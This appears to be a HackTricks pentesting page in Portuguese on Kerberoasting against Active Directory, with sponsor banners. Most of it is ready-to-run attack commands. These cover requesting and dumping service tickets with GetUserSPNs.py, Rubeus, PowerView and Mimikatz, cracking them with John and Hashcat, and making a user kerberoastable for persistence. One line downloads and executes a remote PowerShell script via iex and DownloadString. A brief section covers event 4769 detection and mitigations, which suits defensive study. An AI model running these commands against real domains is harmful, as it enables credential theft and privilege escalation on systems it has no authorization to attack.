## Kerberoast

O objetivo do **Kerberoasting** é coletar **tickets TGS para serviços que são executados em nome de contas de usuário** no AD, não em contas de computador. Assim, **parte** desses tickets TGS são **criptografados** com **chaves** derivadas de senhas de usuário. Como consequência, suas credenciais podem ser **quebradas offline**.\
Você pode saber que uma **conta de usuário** está sendo usada como um **serviço** porque a propriedade **"ServicePrincipalName"** não é nula.

Portanto, para realizar o Kerberoasting, apenas uma conta de domínio que possa solicitar TGSs é necessária, o que pode ser qualquer pessoa, já que nenhum privilégio especial é necessário.

**Você precisa de credenciais válidas dentro do domínio.**

### **Ataque**

{% hint style="warning" %}
As ferramentas de **Kerberoasting** geralmente solicitam **`criptografia RC4`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque o **RC4 é** [**mais fraco**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) e mais fácil de quebrar offline usando ferramentas como o Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
Os hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto os AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
msf> use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```
#### Windows

* **Enumerar usuários Kerberoastáveis**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar TGS e despejá-lo da memória**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Ferramentas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Quando um TGS é solicitado, o evento do Windows `4769 - Um ticket de serviço Kerberos foi solicitado` é gerado.
{% endhint %}



![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Quebrando
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistência

Se você tiver **permissões suficientes** sobre um usuário, você pode torná-lo **kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Você pode encontrar **ferramentas** úteis para ataques **kerberoast** aqui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se você encontrar este **erro** no Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** é por causa do horário local, você precisa sincronizar o host com o DC. Existem algumas opções:
- `ntpdate <IP do DC>` - Descontinuado a partir do Ubuntu 16.04
- `rdate -n <IP do DC>`

### Mitigação

Kerberoast é muito furtivo se explorado

* Security Event ID 4769 – Um ticket Kerberos foi solicitado
* Como 4769 é muito frequente, vamos filtrar os resultados:
* O nome do serviço não deve ser krbtgt
* O nome do serviço não deve terminar com $ (para filtrar contas de máquinas usadas para serviços)
* O nome da conta não deve ser machine@domain (para filtrar solicitações de máquinas)
* O código de falha é '0x0' (para filtrar falhas, 0x0 é sucesso)
* Mais importante, o tipo de criptografia do ticket é 0x17
* Mitigação:
* As senhas da conta de serviço devem ser difíceis de adivinhar (mais de 25 caracteres)
* Use Contas de Serviço Gerenciadas (Mudança automática de senha periodicamente e gerenciamento delegado de SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
**Mais informações sobre Kerberoasting em ired.team em** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**e** [**aqui**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunitárias mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
